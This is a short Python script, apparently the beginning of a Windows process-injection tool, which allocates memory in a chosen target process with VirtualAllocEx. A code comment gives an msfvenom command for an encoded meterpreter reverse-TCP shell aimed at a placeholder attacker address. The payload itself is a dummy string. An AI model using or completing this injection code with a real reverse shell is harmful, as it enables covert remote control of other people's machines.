from process import Process
from argparse import ArgumentParser

if __name__ == "__main__":
   parser = ArgumentParser() 
   parser.add_argument(
        "-pid", "--by-pid",
        default=False,
        help="PROC will be a PID instead of a process name"
    )
   parser.add_argument("PROC", help="the target process")

   args = parser.parse_args()
   
   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] EXITFUNC=thread -f python –e x86/shikata_ga_nai
   payload = bytearray(
      "Testing"
   , "utf-8")
   
   with Process(args.PROC, pid=args.by_pid) as ps_handle:
       # Allocating memory in target process with VirtualAllocEx
       base_addr = ps_handle.virtual_alloc_ex(len(payload))
       print(base_addr)
       print("PID", ps_handle.pid)
